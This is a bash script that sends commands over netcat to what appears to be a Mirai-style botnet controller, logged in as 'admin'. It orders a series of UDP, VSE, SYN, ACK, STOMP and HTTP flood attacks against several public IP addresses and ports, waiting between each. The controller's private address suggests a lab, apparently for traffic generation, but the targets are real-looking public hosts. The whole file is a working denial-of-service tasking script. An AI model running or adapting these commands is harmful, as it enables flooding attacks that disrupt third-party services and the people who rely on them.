#!/bin/bash
TEMPO=10
USR='admin'
NC='nc 192.168.56.3 101'

#sleep 20m

#UDP
echo "$USR|udp 23.23.78.18 $TEMPO dport=33434" | $NC
sleep $((2*$TEMPO))s

#VSE
echo "$USR|vse 216.58.222.78 $TEMPO dport=27015" | $NC
sleep $((2*$TEMPO))s

#UDP Generic
echo "$USR|udpplain 208.67.220.220 $TEMPO dport=53" | $NC
sleep $((2*$TEMPO))s


#TCP Syn
echo "$USR|syn 174.129.217.97 $TEMPO dport=3478" | $NC
sleep $((2*$TEMPO))s

#TCP ACK
echo "$USR|ack 3.232.162.145 $TEMPO dport=9998" | $NC
sleep $((2*$TEMPO))s

#TCP Stomp
echo "$USR|stomp 15.72.34.55 $TEMPO dport=5223" | $NC
sleep $((2*$TEMPO))s

#TCP HTTP
echo "$USR|http 34.230.191.96 $TEMPO dport=80" | $NC
sleep $((2*$TEMPO))s
